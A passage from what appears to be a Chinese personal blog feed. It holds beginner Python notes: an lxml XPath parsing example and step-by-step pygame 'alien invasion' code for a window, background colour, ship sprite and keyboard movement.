<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree  <span class="comment"># 导入lxml库</span></span><br><span class="line">text = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;div&gt;</span></span><br><span class="line"><span class="string">    &lt;ul&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-0&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;link1.html&quot;&gt;first item&lt;/a&gt;</span></span><br><span class="line"><span class="string">         &lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-1&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;</span></span><br><span class="line"><span class="string">         &lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-inactive&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;link3.html&quot;&gt;third item&lt;/a&gt;</span></span><br><span class="line"><span class="string">         &lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-1&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;</span></span><br><span class="line"><span class="string">        &lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-0&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;link5.html&quot;&gt;爬虫&lt;/a&gt;  </span></span><br><span class="line"><span class="string">         &lt;/li&gt;</span></span><br><span class="line"><span class="string">     &lt;/ul&gt;</span></span><br><span class="line"><span class="string"> &lt;/div&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># etree 模块下有一个html类，叫html的字符串进行初始化，构造一个 XPath 解析对象</span></span><br><span class="line">html = etree.HTML(text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># etree 模块下有一个`XPath`方法，用这个方法的XPath语法就可以进行数据的提取了</span></span><br><span class="line">divs=html.xpath(<span class="string">r&#x27;//a/text()&#x27;</span>) <span class="comment"># /text()获得文本内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">print(divs)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;first item&#x27;</span>, <span class="string">&#x27;second item&#x27;</span>, <span class="string">&#x27;third item&#x27;</span>, <span class="string">&#x27;fourth item&#x27;</span>, <span class="string">&#x27;爬虫&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210825113215572.png" alt="image-20210825113215572"></p>
<h1 id="学习中"><a href="#学习中" class="headerlink" title="学习中"></a>学习中</h1>]]></content>
      <categories>
        <category>Python爬虫</category>
      </categories>
      <tags>
        <tag>Python爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>python外星人入侵</title>
    <url>/2021/03/23/pythonGUI/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p>笔记</p>
<h1 id="创建一个窗口"><a href="#创建一个窗口" class="headerlink" title="创建一个窗口"></a>创建一个窗口</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys   <span class="comment"># 导入sys用于退出用</span></span><br><span class="line"><span class="keyword">import</span> pygame	<span class="comment"># 创建窗口用</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 窗口的宽长他是一个元组</span></span><br><span class="line">i=(<span class="number">1200</span>,<span class="number">800</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个窗口</span></span><br><span class="line">screen=pygame.display.set_mode(i)</span><br></pre></td></tr></table></figure>
<p>看一下运行结果，他只显示了，标题没有显示窗口啊]</p>
<p>![2021-03-16 09-05-57](<a href="https://cdn.jsdelivr.net/gh/wzass/giteezp/2021-03-16">https://cdn.jsdelivr.net/gh/wzass/giteezp/2021-03-16</a> 09-05-57.png)</p>
<div class="note info simple"><p>显示窗口可以用<code>pygame.display.flip()  </code></p>
</div>



<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys   <span class="comment"># 导入sys用于退出用</span></span><br><span class="line"><span class="keyword">import</span> pygame	<span class="comment"># 创建窗口用</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 窗口的宽长他是一个元组</span></span><br><span class="line">i=(<span class="number">1200</span>,<span class="number">800</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个窗口</span></span><br><span class="line">screen=pygame.display.set_mode(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制屏幕可见</span></span><br><span class="line">pygame.display.flip()  </span><br></pre></td></tr></table></figure>
<p>结果会很快就消失了</p>
<p>![2021-03-16 09-12-19](<a href="https://cdn.jsdelivr.net/gh/wzass/giteezp/2021-03-16">https://cdn.jsdelivr.net/gh/wzass/giteezp/2021-03-16</a> 09-12-19.png)</p>
<div class="note info simple"><p>我们可以添加循环，这样每次都会刷新绘制屏幕可见</p>
</div>



<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys   <span class="comment"># 导入sys用于退出用</span></span><br><span class="line"><span class="keyword">import</span> pygame	<span class="comment"># 创建窗口用</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 窗口的宽长他是一个元组</span></span><br><span class="line">i=(<span class="number">1200</span>,<span class="number">800</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个窗口</span></span><br><span class="line">screen=pygame.display.set_mode(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 死循环</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 绘制屏幕可见</span></span><br><span class="line">    pygame.display.flip()  </span><br></pre></td></tr></table></figure>
<p>结果可以看见一直都是显示</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210317103052622.png" alt="image-20210317103052622"></p>
<div class="note info simple"><p>我们可以设置他的标题名字<code>pygame.display.set_caption(标题名)</code></p>
</div>

<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys   <span class="comment"># 导入sys用于退出用</span></span><br><span class="line"><span class="keyword">import</span> pygame	<span class="comment"># 创建窗口用</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 窗口的宽长他是一个元组</span></span><br><span class="line">i=(<span class="number">1200</span>,<span class="number">800</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个窗口</span></span><br><span class="line">screen=pygame.display.set_mode(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 标题名字</span></span><br><span class="line">m=<span class="string">&quot;abc&quot;</span></span><br><span class="line">pygame.display.set_caption(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 死循环</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 绘制屏幕可见</span></span><br><span class="line">    pygame.display.flip()  </span><br></pre></td></tr></table></figure>
<p>结果</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210316092344835.png" alt="image-20210316092344835"></p>
<div class="note info simple"><p>然后我们发现他的窗口是关闭不了的，我们可以用sys模块进行判断关闭窗口</p>
</div>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"></span><br><span class="line"><span class="comment"># 窗口的宽长他是一个元组</span></span><br><span class="line">i=(<span class="number">1200</span>,<span class="number">800</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个窗口</span></span><br><span class="line">screen=pygame.display.set_mode(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 标题名字</span></span><br><span class="line">m=<span class="string">&quot;abc&quot;</span></span><br><span class="line">pygame.display.set_caption(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 死循环</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 监听键盘和鼠标的事件</span></span><br><span class="line">    <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 点击窗口的关闭，就会检查到pygame.QUIT然后退出循环</span></span><br><span class="line">        <span class="keyword">if</span> event.type==pygame.QUIT:</span><br><span class="line">            sys.exit()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 绘制屏幕可见</span></span><br><span class="line">    pygame.display.flip()</span><br></pre></td></tr></table></figure>
<p>结果然后就可以关闭了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210317103907215.png" alt="image-20210317103907215"></p>
<h1 id="设置背景颜色"><a href="#设置背景颜色" class="headerlink" title="设置背景颜色"></a>设置背景颜色</h1><div class="note info simple"><p>他默认是黑色，我们可以用<code>screen.fill()</code>方法来填充颜色</p>
</div>

<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"></span><br><span class="line"><span class="comment"># 窗口的宽长他是一个元组</span></span><br><span class="line">i=(<span class="number">1200</span>,<span class="number">800</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个窗口</span></span><br><span class="line">screen=pygame.display.set_mode(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 标题名字</span></span><br><span class="line">m=<span class="string">&quot;abc&quot;</span></span><br><span class="line">pygame.display.set_caption(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 背景颜色</span></span><br><span class="line">bg=(<span class="number">230</span>,<span class="number">230</span>,<span class="number">230</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 死循环</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 监听键盘和鼠标的事件</span></span><br><span class="line">    <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 点击窗口的关闭，就会检查到pygame.QUIT然后退出循环</span></span><br><span class="line">        <span class="keyword">if</span> event.type==pygame.QUIT:</span><br><span class="line">            sys.exit()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment"># 填充颜色</span></span><br><span class="line">    screen.fill(bg)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 绘制屏幕可见</span></span><br><span class="line">    pygame.display.flip()</span><br></pre></td></tr></table></figure>


<p>结果</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210317104402334.png" alt="image-20210317104402334"></p>
<h1 id="创建类"><a href="#创建类" class="headerlink" title="创建类"></a>创建类</h1><div class="note info simple"><p>书上说的意思是如果这样写下去会代码很长，我们就可以创建一个类就可以避免这个代码太长不好管理的问题他默认是黑色，我们可以用<code>screen.fill()</code>方法来填充颜色</p>
</div>

<p>我叫上面的代码分到两个文件里面</p>
<p><code>PingMuXianShi.py</code>文件里面内容，我这个文件是设置屏幕的我为了自己好认就自己改了个名字</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XianShi</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 窗口的宽</span></span><br><span class="line">        self.width=<span class="number">1200</span></span><br><span class="line">        <span class="comment"># 窗口的长</span></span><br><span class="line">        self.height=<span class="number">800</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 背景颜色</span></span><br><span class="line">        self.gb=(<span class="number">230</span>,<span class="number">230</span>,<span class="number">230</span>)</span><br></pre></td></tr></table></figure>
<p><code>zhu1.py</code>这个是住文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"></span><br><span class="line"><span class="comment"># PingMuXianShi是文件名，XianShi是PingMuXianShi文件里面的类名</span></span><br><span class="line"><span class="keyword">from</span> PingMuXianShi <span class="keyword">import</span> XianShi </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">game</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建对象</span></span><br><span class="line">    xian_shi=XianShi()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建一个窗口，都有XianShi类里面的width和height</span></span><br><span class="line">    screen=pygame.display.set_mode((xian_shi.width,xian_shi.height))  </span><br><span class="line"></span><br><span class="line">    <span class="comment"># 窗口的名字</span></span><br><span class="line">    pygame.display.set_caption(<span class="string">&quot;abc&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 死循环</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">        pygame.init()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 监听键盘和鼠标的事件</span></span><br><span class="line">        <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 点击窗口的关闭，就会检查到pygame.QUIT然后退出循环</span></span><br><span class="line">            <span class="keyword">if</span> event.type==pygame.QUIT:</span><br><span class="line">                sys.exit()</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="comment"># 填充颜色 ,用的是PingMuXianShi文件里面的XianShi类的gb属性</span></span><br><span class="line">        screen.fill(xian_shi.gb)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 绘制屏幕可见</span></span><br><span class="line">        pygame.display.flip()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="构建飞船"><a href="#构建飞船" class="headerlink" title="构建飞船"></a>构建飞船</h1><p>我添加一个<code>ship.py</code>文件</p>
<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ship</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># screen用于传参数</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,screen</span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 叫screen穿的参数给self.screen</span></span><br><span class="line">        self.screen=screen</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 去哪个目录加载图像返回值给了self.ima</span></span><br><span class="line">        self.ima=pygame.image.load(<span class="string">&#x27;/home/zss/笔记/外星人入侵项目/ima/ship.bmp&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 获得外部矩形</span></span><br><span class="line">        self.rect=self.ima.get_rect()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 屏幕矩形</span></span><br><span class="line">        self.screen_rect=screen.get_rect()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># centerx这个英文是中间的意思，就是叫图片放到中间，这个就是x轴，他还有一个y轴</span></span><br><span class="line">        self.rect.centerx=self.screen_rect.centerx</span><br><span class="line"></span><br><span class="line">        <span class="comment"># bottom英文是底部的意思，就是叫图片放到底部</span></span><br><span class="line">        self.rect.bottom=self.screen_rect.bottom</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建一个blitme类</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">blitme</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 在屏幕上绘制图形</span></span><br><span class="line">        self.screen.blit(self.ima,self.rect)</span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<p><code>zhu1.py</code>里面代码添加</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"></span><br><span class="line"><span class="comment"># PingMuXianShi是文件名，XianShi是PingMuXianShi文件里面的类名</span></span><br><span class="line"><span class="keyword">from</span> PingMuXianShi <span class="keyword">import</span> XianShi </span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入ship文件里面的ship的类</span></span><br><span class="line"><span class="keyword">from</span> ship <span class="keyword">import</span> Ship</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">game</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建对象</span></span><br><span class="line">    xian_shi=XianShi()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建一个窗口，都有XianShi类里面的width和height</span></span><br><span class="line">    screen=pygame.display.set_mode((xian_shi.width,xian_shi.height))  </span><br><span class="line"></span><br><span class="line">    <span class="comment"># 窗口的名字</span></span><br><span class="line">    pygame.display.set_caption(<span class="string">&quot;abc&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建一个飞船</span></span><br><span class="line">    ship=Ship(screen)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 死循环</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 监听键盘和鼠标的事件</span></span><br><span class="line">        <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 点击窗口的关闭，就会检查到pygame.QUIT然后退出循环</span></span><br><span class="line">            <span class="keyword">if</span> event.type==pygame.QUIT:</span><br><span class="line">                sys.exit()</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="comment"># 填充颜色 ,用的是PingMuXianShi文件里面的XianShi类的gb属性</span></span><br><span class="line">        screen.fill(xian_shi.gb)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        ship.blitme()</span><br><span class="line">        <span class="comment"># 绘制屏幕可见</span></span><br><span class="line">        pygame.display.flip()</span><br><span class="line"></span><br><span class="line">game()</span><br></pre></td></tr></table></figure>
<p>查看运行结果，可以看见有一个小船</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210318090503734.png" alt="image-20210318090503734"></p>
<h1 id="重构"><a href="#重构" class="headerlink" title="重构"></a>重构</h1><div class="note info simple"><p>下面这样更容易让我们扩展，可以避免住文件里面太长</p>
</div>

<p>我们创建一个<code>game_funcltions.py</code>文件用于关闭和屏幕显</p>
<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 监听键盘和鼠标的事件</span></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">check_events</span>():</span></span><br><span class="line">    <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">            <span class="comment"># 点击窗口的关闭，就会检查到pygame.QUIT然后退出循环</span></span><br><span class="line">        <span class="keyword">if</span> event.type==pygame.QUIT:</span><br><span class="line">            sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_screen</span>(<span class="params">xian_shi,screen,ship</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 填充颜色 ,用的是PingMuXianShi文件里面的XianShi类的gb属性</span></span><br><span class="line">    screen.fill(xian_shi.gb)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 绘制飞船</span></span><br><span class="line">    ship.blitme()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 绘制屏幕可见</span></span><br><span class="line">    pygame.display.flip()    </span><br></pre></td></tr></table></figure>
<p>主文件代码就变得很少了</p>
<p>下面是<code>zhu1.py</code>文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="comment"># PingMuXianShi是文件名，XianShi是PingMuXianShi文件里面的类名</span></span><br><span class="line"><span class="keyword">from</span> PingMuXianShi <span class="keyword">import</span> XianShi </span><br><span class="line"><span class="comment"># 导入ship文件里面的ship的类</span></span><br><span class="line"><span class="keyword">from</span> ship <span class="keyword">import</span> Ship</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入game_funcltions文件</span></span><br><span class="line"><span class="keyword">import</span> game_funcltions </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">game</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建对象</span></span><br><span class="line">    xian_shi=XianShi()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建一个窗口，都有XianShi类里面的width和height</span></span><br><span class="line">    screen=pygame.display.set_mode((xian_shi.width,xian_shi.height))  </span><br><span class="line"></span><br><span class="line">    <span class="comment"># 窗口的名字</span></span><br><span class="line">    pygame.display.set_caption(<span class="string">&quot;外星人入侵&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建一个飞船</span></span><br><span class="line">    ship=Ship(screen)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 死循环</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 用game_funcltions文件里面的check_events函数 点击窗口的关闭</span></span><br><span class="line">        game_funcltions.check_events()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 用game_funcltions文件里面的update_screen绘制图形</span></span><br><span class="line">        game_funcltions.update_screen(xian_shi,screen,ship)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">game()</span><br></pre></td></tr></table></figure>
<p>结果</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210318092845374.png" alt="image-20210318092845374"></p>
<h1 id="移动飞船"><a href="#移动飞船" class="headerlink" title="移动飞船"></a>移动飞船</h1><h2 id="右移动"><a href="#右移动" class="headerlink" title="右移动"></a>右移动</h2><div class="note info simple"><p>在python里面每一个键盘和鼠标垫事件都会<code>pygame.event.get()</code>捕获到，然后我们就可以按一个建加飞船的x和y轴</p>
</div>

<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 监听键盘和鼠标的事件</span></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">check_events</span>(<span class="params">ship</span>):</span></span><br><span class="line">    <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">            <span class="comment"># 点击窗口的关闭，就会检查到pygame.QUIT然后退出循环</span></span><br><span class="line">        <span class="keyword">if</span> event.type==pygame.QUIT:</span><br><span class="line">            sys.exit()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 监听建键盘的建，如果你按键盘了他是会被执行</span></span><br><span class="line">        <span class="keyword">elif</span> event.type==pygame.KEYDOWN:</span><br><span class="line"></span><br><span class="line">            <span class="comment"># K_RIGHT这个就是我们键盘的右建事件如果我们点击了下面就会被执行</span></span><br><span class="line">            <span class="keyword">if</span> event.key==pygame.K_RIGHT:</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 像右移动多少</span></span><br><span class="line">                ship.rect.centerx+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_screen</span>(<span class="params">xian_shi,screen,ship</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 填充颜色 ,用的是PingMuXianShi文件里面的XianShi类的gb属性</span></span><br><span class="line">    screen.fill(xian_shi.gb)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 绘制飞船</span></span><br><span class="line">    ship.blitme()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 绘制屏幕可见</span></span><br><span class="line">    pygame.display.flip()    </span><br></pre></td></tr></table></figure>
<p>上面添加的代码是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 监听建键盘的建，如果你按键盘了他是会被执行</span></span><br><span class="line">        <span class="keyword">elif</span> event.type==pygame.KEYDOWN:</span><br><span class="line"></span><br><span class="line">            <span class="comment"># K_RIGHT这个就是我们键盘的右建事件如果我们点击了下面就会被执行</span></span><br><span class="line">            <span class="keyword">if</span> event.key==pygame.K_RIGHT:</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 像右移动多少</span></span><br><span class="line">                ship.rect.centerx+=<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h2 id="持续移动"><a href="#持续移动" class="headerlink" title="持续移动"></a>持续移动</h2><div class="note info simple"><p>上面的点一下他才运行，下面用到了两个事件，进行持续移动</p>
<p><code>KEYDOWN</code>如果你按键盘了他是会被执行</p>
<p><code>KEYUP</code>我们按键松了他是会被执行</p>
</div>

<p><code>game_funcltions.py</code>文件代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 监听键盘和鼠标的事件</span></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">check_events</span>(<span class="params">ship</span>):</span></span><br><span class="line">    <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">            <span class="comment"># 点击窗口的关闭，就会检查到pygame.QUIT然后退出循环</span></span><br><span class="line">        <span class="keyword">if</span> event.type==pygame.QUIT:</span><br><span class="line">            sys.exit()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 监听建键盘的建，如果你按键盘了他是会被执行</span></span><br><span class="line">        <span class="keyword">elif</span> event.type==pygame.KEYDOWN:</span><br><span class="line"></span><br><span class="line">            <span class="comment"># K_RIGHT这个就是我们键盘的右建事件如果我们点击和松开了下面就会被执行</span></span><br><span class="line">            <span class="keyword">if</span> event.key==pygame.K_RIGHT:</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 就会叫这个ship.moving_right属性设置为True</span></span><br><span class="line">                ship.moving_right=<span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 我们按键松开就会检查到KEYUP事件，下面的代码就会执行</span></span><br><span class="line">        <span class="keyword">elif</span> event.type==pygame.KEYUP:</span><br><span class="line"></span><br><span class="line">            <span class="comment"># K_RIGHT这个就是我们键盘的右建事件如果我们点击和松开了下面就会被执行</span></span><br><span class="line">            <span class="keyword">if</span> event.key==pygame.K_RIGHT:</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 就会叫这个ship.moving_right属性设置为False </span></span><br><span class="line">                ship.moving_right=<span class="literal">False</span>       </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_screen</span>(<span class="params">xian_shi,screen,ship</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 填充颜色 ,用的是PingMuXianShi文件里面的XianShi类的gb属性</span></span><br><span class="line">    screen.fill(xian_shi.gb)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 绘制飞船</span></span><br><span class="line">    ship.blitme()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 绘制屏幕可见</span></span><br><span class="line">    pygame.display.flip()    </span><br></pre></td></tr></table></figure>
<p>修改的代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 监听建键盘的建，如果你按键盘了他是会被执行</span></span><br><span class="line"><span class="keyword">elif</span> event.type==pygame.KEYDOWN:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># K_RIGHT这个就是我们键盘的右建事件如果我们点击和松开了下面就会被执行</span></span><br><span class="line">    <span class="keyword">if</span> event.key==pygame.K_RIGHT:</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 就会叫这个ship.moving_right属性设置为True</span></span><br><span class="line">        ship.moving_right=<span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 我们按键松开就会检查到KEYUP事件，下面的代码就会执行</span></span><br><span class="line"><span class="keyword">elif</span> event.type==pygame.KEYUP:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># K_RIGHT这个就是我们键盘的右键事件如果我们点击和松开了下面就会被执行</span></span><br><span class="line">    <span class="keyword">if</span> event.key==pygame.K_RIGHT:</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 就会叫这个ship.moving_right属性设置为False </span></span><br><span class="line">        ship.moving_right=<span class="literal">False</span>      </span><br></pre></td></tr></table></figure>
<p><code>zhu1.py</code>文件主代码</p>
